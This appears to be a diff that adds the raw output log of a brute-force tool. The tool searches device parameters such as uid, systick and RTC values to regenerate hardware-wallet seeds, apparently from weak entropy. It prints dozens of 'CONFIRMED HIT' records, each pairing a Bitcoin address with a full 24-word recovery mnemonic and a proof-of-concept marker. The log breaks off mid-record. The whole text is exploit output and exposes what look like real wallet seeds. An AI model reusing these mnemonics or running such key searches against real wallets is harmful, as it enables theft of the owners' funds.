+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023002c
+  systick  = 33308
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023002d
+  systick  = 33309
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023002e
+  systick  = 33310
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023002f
+  systick  = 33311
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230030
+  systick  = 33280
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230031
+  systick  = 33281
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230032
+  systick  = 33282
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230033
+  systick  = 33283
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230034
+  systick  = 33284
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230035
+  systick  = 33285
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230036
+  systick  = 33286
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230037
+  systick  = 33287
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230038
+  systick  = 33288
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230039
+  systick  = 33289
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023003a
+  systick  = 33290
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023003b
+  systick  = 33291
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023003c
+  systick  = 33292
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023003d
+  systick  = 33293
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023003e
+  systick  = 33294
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023003f
+  systick  = 33295
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230040
+  systick  = 33392
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230041
+  systick  = 33393
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230042
+  systick  = 33394
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230043
+  systick  = 33395
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230044
+  systick  = 33396
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230045
+  systick  = 33397
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230046
+  systick  = 33398
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230047
+  systick  = 33399
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230048
+  systick  = 33400
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230049
+  systick  = 33401
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230050
+  systick  = 33376
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230051
+  systick  = 33377
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230052
+  systick  = 33378
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230053
+  systick  = 33379
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230054
+  systick  = 33380
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230055
+  systick  = 33381
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230056
+  systick  = 33382
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230057
+  systick  = 33383
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230058
+  systick  = 33384
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230059
+  systick  = 33385
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230060
+  systick  = 33360
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230061
+  systick  = 33361
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230062
+  systick  = 33362
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230063
+  systick  = 33363
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230064
+  systick  = 33364
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230065
+  systick  = 33365
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230066
+  systick  = 33366
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230067
+  systick  = 33367
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230068
+  systick  = 33368
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230069
+  systick  = 33369
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230070
+  systick  = 33344
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230071
+  systick  = 33345
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230072
+  systick  = 33346
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+[40.50%] 267.52M/660.56M @ 44.25K/s  ETA 2.47h
+[43.03%] 284.24M/660.56M @ 44.25K/s  ETA 2.36h
+[45.56%] 300.96M/660.56M @ 44.23K/s  ETA 2.26h
+[48.09%] 317.68M/660.56M @ 44.24K/s  ETA 2.15h
+[50.62%] 334.40M/660.56M @ 44.24K/s  ETA 2.05h
+[53.15%] 351.12M/660.56M @ 44.23K/s  ETA 1.94h
+[55.69%] 367.84M/660.56M @ 44.24K/s  ETA 1.84h
+[58.22%] 384.56M/660.56M @ 44.24K/s  ETA 1.73h
+[60.75%] 401.28M/660.56M @ 44.23K/s  ETA 1.63h
+[63.28%] 418.00M/660.56M @ 44.23K/s  ETA 1.52h
+[65.81%] 434.72M/660.56M @ 44.24K/s  ETA 1.42h
+[68.34%] 451.44M/660.56M @ 44.23K/s  ETA 1.31h
+[70.87%] 468.16M/660.56M @ 44.22K/s  ETA 1.21h
+[73.40%] 484.88M/660.56M @ 44.22K/s  ETA 1.10h
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460000
+  systick  = 53001
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460001
+  systick  = 53000
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460002
+  systick  = 53003
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460003
+  systick  = 53002
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460004
+  systick  = 53005
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460005
+  systick  = 53004
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460006
+  systick  = 53007
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460007
+  systick  = 53006
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460008
+  systick  = 52993
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460009
+  systick  = 52992
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046000a
+  systick  = 52995
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046000b
+  systick  = 52994
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046000c
+  systick  = 52997
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046000d
+  systick  = 52996
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
